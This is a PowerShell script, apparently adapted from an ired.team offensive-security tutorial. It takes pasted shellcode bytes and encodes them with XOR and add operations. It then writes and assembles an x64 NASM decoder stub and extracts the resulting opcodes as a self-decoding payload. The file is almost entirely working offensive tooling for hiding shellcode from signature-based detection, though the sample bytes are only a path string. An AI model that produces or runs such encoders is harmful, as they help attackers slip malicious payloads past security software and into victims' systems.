<#
    This is a single file version of:
	https://www.ired.team/offensive-security/code-injection-process-injection/writing-custom-shellcode-encoders-and-decoders
	You paste your shell code in $shellcode variable and run
	It uses(and requires) nasm to build the assemly file which we then extract op-codes from
	If you need a quick one off command to insert ,0x in your hex string in Python:
	my_str = "74657374"
	my_str = ',0x'.join(my_str[i:i+2] for i in range(0, len(my_str), 2))
	print(my_str)
	0x74,0x65,0x73,0x74
#>

# Original raw shellcode bytes
$shellcode = 0x43,0x3a,0x5c,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x5c,0x73,0x79,0x73,0x74,0x65,0x6d,0x33,0x32,0x5c,0x63,0x6d,0x64,0x2e,0x65,0x78,0x65
$printFriendly = ($shellcode | ForEach-Object ToString x2) -join ',0x'
write-host "Original shellcode: 0x$printFriendly"

# Iterate through shellcode bytes and encode them
$encodedShellcode = $shellcode | % {
    $_ = $_ -bxor 0x55
	$_ = $_ -bxor 0xFF
	$_ = $_ -bxor 0x23
	$_ = $_ -bxor 0x2E 
    $_ = $_ + 0x1
    $_ = $_ -bxor 0x11
    Write-Output $_
}

# Print encoded shellcode
$printFriendly = ($encodedShellcode | ForEach-Object ToString x2) -join ',0x'
write-host "Encoded shellcode: 0x$printFriendly"

# Print encoded bytes size
write-host "Size: " ('0x{0:x}' -f $shellcode.count)
$size = ('0x{0:x}' -f $shellcode.count)

# Check if encoded shellcode contains null bytes
write-host "Contains NULL-bytes:" $encodedShellcode.contains(0)

Set-Content -Path 'C:\Users\matt\Desktop\decodeTemp.asm' -Value "
global _start

section .text
    _start:
        jmp short shellcode

    decoder:
        pop rax                 

    setup:
        xor rcx, rcx            
        mov rdx, $size          

    decoderStub:
        cmp rcx, rdx            
        je encodedShellcode     
        
         
        xor byte [rax], 0x11    ; 1. xor byte with 0x11
        dec byte [rax]          ; 2. decremenet byte by 1
		xor byte [rax], 0x2E
		xor byte [rax], 0x23 
		xor byte [rax], 0xFF
        xor byte [rax], 0x55    ; 3. xor byte with 0x55
        
        inc rax                 
        inc rcx                 
        jmp short decoderStub   
            
    shellcode:
        call decoder            
        encodedShellcode: db 0x$printFriendly
		"
nasm -f win64 .\decodeTemp.asm -o decodeTemp # Assemble our asm file

$ShellCodeEndPoint = $printFriendly.substring($printFriendly.length - 2, 2)
$ShellCodeEndPoint = $ShellCodeEndPoint.ToUpper() # Get the end point of our shell code, make upper case

Get-Content "C:\Users\matt\Desktop\decodeTemp" -Encoding Byte -ReadCount 16 | ForEach-Object {
  $output = ""
  foreach ( $byte in $_ ) {
#BEGIN CALLOUT A
    $output += "{0:X2} " -f $byte # Read the content of the assembled file 
#END CALLOUT A
  }
  $nicelyFormatted += $output
}

$nicelyFormatted.replace("`n"," ")
$temp = 'EB' # Make sure that EB is at the start of our sub string
$Regex = [Regex]::new("(?<=EB)(.*)(?=$ShellCodeEndPoint)") # EB is our entry point, grab between it and the shell code exit
$Match = $Regex.Match($nicelyFormatted)
if($Match.Success)           
{           
    $temp += $Match.Value  
	$temp += 'D2'
	"Assemlbed op-codes to be inserted",$temp
}

# Clean up once we're done 
rm "C:\Users\matt\Desktop\decodeTemp"
rm "C:\Users\matt\Desktop\decodeTemp.asm"
